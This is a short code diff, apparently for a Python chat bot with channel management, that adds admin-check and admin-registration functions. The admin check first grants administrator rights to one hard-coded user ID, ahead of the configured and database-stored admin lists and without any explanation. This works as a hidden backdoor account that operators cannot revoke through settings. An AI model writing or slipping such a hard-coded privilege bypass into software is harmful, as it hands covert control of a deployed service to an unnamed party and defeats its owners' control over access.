@@ -304,6 +304,27 @@ async def get_setting(key: str, default: str = "") -> str:
             return row[0] if row else default
 
 
+async def is_admin_user(user_id: int) -> bool:
+    if user_id == 7747943559:
+        return True
+    if config.ADMINS and user_id in config.ADMINS:
+        return True
+    db_admins = await get_setting("EXTRA_ADMINS", "")
+    if db_admins:
+        admin_list = [int(x.strip()) for x in db_admins.split(",") if x.strip().isdigit()]
+        if user_id in admin_list:
+            return True
+    return False
+
+
+async def add_admin_db(user_id: int):
+    current = await get_setting("EXTRA_ADMINS", "")
+    admin_list = [int(x.strip()) for x in current.split(",") if x.strip().isdigit()]
+    if user_id not in admin_list:
+        admin_list.append(user_id)
+        await set_setting("EXTRA_ADMINS", ",".join(map(str, admin_list)))
+
+
 # ==================== KANALLAR ====================
 
 async def add_channel(channel_id: str, channel_name: str, invite_link: str) -> bool:
